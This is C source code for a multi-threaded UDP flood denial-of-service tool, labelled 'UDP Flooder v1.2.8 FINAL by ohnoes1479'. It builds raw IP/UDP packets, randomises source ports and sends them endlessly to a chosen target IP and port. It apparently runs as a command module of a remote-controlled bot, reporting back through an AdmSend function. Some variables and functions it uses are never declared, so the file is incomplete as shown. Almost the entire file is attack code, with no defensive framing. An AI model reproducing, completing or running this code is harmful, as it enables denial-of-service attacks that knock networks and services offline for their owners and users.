#include <time.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

//static uint32_t Q[4096], c = 362436;

struct thread_data_udp{
	int pks;
	int throttle;
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
};

void init_rand_udp(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++)
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc_udp(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

char *myStrCat (char *s, char *a) {
	while (*s != '\0') s++;
	while (*a != '\0') *s++ = *a++;
	*s = '\0';
	return s;
}

char *replStr (char *str, size_t count) {
	if (count == 0) return NULL;
	char *ret = malloc (strlen (str) * count + count);
	if (ret == NULL) return NULL;
	*ret = '\0';
	char *tmp = myStrCat (ret, str);
	while (--count > 0) {
		tmp = myStrCat (tmp, str);
	}
	return ret;
}


/* function for header checksums */
unsigned short csum_udp (unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}
void setup_ip_header_udp(struct iphdr *iph)
{
	struct ifaddrs *ifaddr, *ifa;
	int family, s;
	char host[NI_MAXHOST];

	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs");
		exit(EXIT_FAILURE);
	}

	/* Walk through linked list, maintaining head pointer so we
	   can free list later */

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == NULL)
			continue;

		family = ifa->ifa_addr->sa_family;

		if (family == AF_INET) {
			s = getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),
					host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
			if (s != 0) {
				//printf("getnameinfo() failed: %s\n", gai_strerror(s));
				exit(EXIT_FAILURE);
			}
			if(strcmp(host, "127.0.0.1") != 0){
				break;
			}
		}
	}
	freeifaddrs(ifaddr);
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;

	// Initial IP, changed later in infinite loop
	iph->saddr = inet_addr(host);
}

void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->check = 0;
}

void *floodudp(void *par1)
{
	struct thread_data_udp *td = (struct thread_data_udp *)par1;
	//  fprintf(stdout, "Thread %d started\n", td->thread_id);
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	char new_ip[sizeof "255.255.255.255"];

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	unsigned int floodport = td->floodport;

	// Clear the data
	memset(datagram, 0, MAX_PACKET_SIZE);

	// Set appropriate fields in headers
	setup_ip_header_udp(iph);
	setup_udp_header(udph);

	char *data = (char *)udph + sizeof(struct udphdr);
	data = replStr("\xFF", td->pks);
	udph->len=htons(td->pks);

	iph->tot_len += td->pks;

	udph->dest = htons(floodport);

	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum_udp ((unsigned short *) datagram, iph->tot_len >> 1);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	int throttle = td->throttle;

	uint32_t random_num;
	uint32_t ul_dst;
	init_rand_udp(time(NULL));
	if(throttle == 0){
		while(1){
			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
			random_num = rand_cmwc_udp();
			udph->source = htons(random_num & 0xFFFF);
			iph->check = csum_udp ((unsigned short *) datagram, iph->tot_len >> 1);
		}
	} else {
		while(1){
			throttle = td->throttle;
			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
			random_num = rand_cmwc_udp();
			udph->source = htons(random_num & 0xFFFF);
			iph->check = csum_udp ((unsigned short *) datagram, iph->tot_len >> 1);

			while(--throttle);
		}
	}
}
int udp(char *s)
{
	signal(SIGALRM,(void (*)(int))kill_child);
	child_pid = fork();
	if (child_pid > 0) {
		wait(NULL);

	}
	else if (child_pid == 0){
		// if(argc < 6){
		// fprintf(stderr, "Invalid parameters!\n");
		// fprintf(stdout, "UDP Flooder v1.2.8 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <throttle (lower is faster)> <packet size> <number threads to use> <time (optional)>\n", argv[0]);
		// exit(-1);
		// }
		time_t my_time;
		time(&my_time);
		struct tm * time_real; 
		time_real = localtime (&my_time);

		struct timespec start, end;
		double start_sec, end_sec, elapsed_sec;
		clock_gettime(CLOCK_REALTIME, &start);



		char i1[128]= "", i2[128]= "", i3[128]= "", i4[128]= "", i5[128]= "", i6[128]= "";
		char *text = s;
		sscanf(text, "%s %s %s %s %s %s", &i1, &i2, &i3, &i4, &i5, &i6);


		time(&my_time);
		time_real = localtime(&my_time);
		AdmSend("%s\nUDP Flooder v1.2.8 FINAL by ohnoes1479\n",asctime(time_real));
		//	AdmSend("%s %s %s %s %s %s",i1, i2, i3, i4, i5, i6);




		AdmSend("Setting up Sockets...\n");

		int num_threads = atoi(i5);
		int packet_size = atoi(i4);
		unsigned int floodport = atoi(i2);
		pthread_t thread[num_threads];
		struct sockaddr_in sin;

		sin.sin_family = AF_INET;
		sin.sin_port = htons(floodport);
		sin.sin_addr.s_addr = inet_addr(i1);

		struct thread_data_udp td[num_threads];

		int i;
		for(i = 0;i<num_threads;i++){
			td[i].thread_id = i;
			td[i].pks = packet_size;
			td[i].sin = sin;
			td[i].floodport = floodport;
			td[i].throttle = atoi(i3);
			pthread_create( &thread[i], NULL, &floodudp, (void *) &td[i]);
		}
		AdmSend("Starting Flood > %s ...\n",i1);
		if(s > 6)
		{
			sleep(atoi(i6));
		} else {
			while(1){
				sleep(1);
			}
		}
		time(&my_time);
		time_real = localtime(&my_time);
		AdmSend("%s\n[UDP DONE]\n",asctime(time_real));
		clock_gettime(CLOCK_REALTIME, &end);
		start_sec = start.tv_sec + start.tv_nsec/NANO_PER_SEC;
		end_sec = end.tv_sec + end.tv_nsec/NANO_PER_SEC;
		elapsed_sec = end_sec - start_sec;
		AdmSend("The operation took %.3f seconds\n", elapsed_sec);
		exit(0);
	}
}
